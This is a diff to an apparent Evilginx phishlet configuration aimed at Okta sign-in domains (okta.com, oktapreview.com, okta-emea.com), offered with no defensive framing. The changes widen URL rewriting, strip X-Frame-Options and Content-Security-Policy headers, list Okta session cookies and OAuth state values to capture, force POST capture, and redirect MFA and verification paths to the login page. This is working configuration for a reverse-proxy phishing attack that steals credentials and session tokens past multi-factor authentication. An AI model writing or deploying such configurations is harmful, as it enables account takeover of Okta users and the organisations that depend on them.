@@ -1,6 +1,6 @@
 min_ver: '3.0.0'
 author: 'evilginx3'
-redirect_url: 'https://{domain}'
+redirect_url: 'https://{orig_hostname}/enduser/dashboard'
 
 proxy_hosts:
   - {phish_sub: '*', orig_sub: '*', domain: 'okta.com', session: true, is_landing: true, auto_filter: true}
@@ -9,26 +9,28 @@ proxy_hosts:
 
 sub_filters:
   - {triggers_on: '*.okta.com', orig_sub: '*', domain: 'okta.com', search: 'https://([a-zA-Z0-9-]+)\\.okta\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: '*.oktapreview.com', orig_sub: '*', domain: 'oktapreview.com', search: 'https://([a-zA-Z0-9-]+)\\.oktapreview\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
-  - {triggers_on: '*.okta-emea.com', orig_sub: '*', domain: 'okta-emea.com', search: 'https://([a-zA-Z0-9-]+)\\.okta-emea\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: '*.oktapreview.com', orig_sub: '*', domain: 'oktapreview.com', search: 'https://([a-zA-Z0-9-]+)\\.oktapreview\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: '*.okta-emea.com', orig_sub: '*', domain: 'okta-emea.com', search: 'https://([a-zA-Z0-9-]+)\\.okta-emea\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: '*.okta.com', orig_sub: '*', domain: 'okta.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
   - {triggers_on: '*.okta.com', orig_sub: '*', domain: 'okta.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
   - {triggers_on: '*.oktapreview.com', orig_sub: '*', domain: 'oktapreview.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
   - {triggers_on: '*.oktapreview.com', orig_sub: '*', domain: 'oktapreview.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: '*.okta-emea.com', orig_sub: '*', domain: 'okta-emea.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: '*.okta-emea.com', orig_sub: '*', domain: 'okta-emea.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
 
 auth_tokens:
   - domain: '.okta.com'
-    keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken', 't', 'dt', 'BC_BANDWIDTH', 'ADRUM', 'ADRUM_BT', 'okta-oauth-nonce', 'okta-oauth-state', 'okta-oauth-redirect-params']
+    keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken', 'BC_BANDWIDTH', 'ADRUM', 'ADRUM_BT', 'okta-oauth-nonce', 'okta-oauth-state', 'okta-oauth-redirect-params']
     type: 'cookie'
-    force_post: false
+    force_post: true
   - domain: '.oktapreview.com'
     keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken']
     type: 'cookie'
-    force_post: false
+    force_post: true
   - domain: '.okta-emea.com'
     keys: ['sid', 'DT', 'idx', 'JSESSIONID', 'oktaStateToken']
     type: 'cookie'
-    force_post: false
+    force_post: true
 
 credentials:
   username:
@@ -77,9 +79,13 @@ auth_urls:
   - '/home/'
 
 login:
-  domain: 'login.okta.com'
+  domain: '*.okta.com'
   path: '/login/login.htm'
 
 path_rewrite:
   - trigger: '/verification'
+    target: '/login/login.htm'
+  - trigger: '/signin/verify'
+    target: '/login/login.htm'
+  - trigger: '/mfa/verify'
     target: '/login/login.htm'
